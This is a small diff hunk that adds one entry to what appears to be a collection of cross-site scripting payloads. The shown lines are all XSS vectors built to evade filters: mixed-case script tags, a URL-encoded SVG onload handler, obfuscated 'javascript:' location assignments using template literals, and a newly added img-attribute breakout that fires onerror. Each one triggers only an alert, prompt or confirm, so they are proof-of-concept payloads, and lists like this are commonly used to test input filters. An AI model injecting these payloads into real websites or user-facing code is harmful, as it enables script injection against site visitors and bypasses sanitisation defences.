@@ -133,3 +133,4 @@ confirm?.(1)
 <ScRipt >prompt(document.domain)</ScRiPt>
 %3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
 <Svg OnLoad= location=textContent>JavaS<a>cript:al<a>ert(<a>1)// Template Literals: <Svg OnLoad= location=`Java${/S/.source}cript:alert${"\50"}1)`>
+<img alt="<x" title="/><img src=x onerror=alert(6)>">
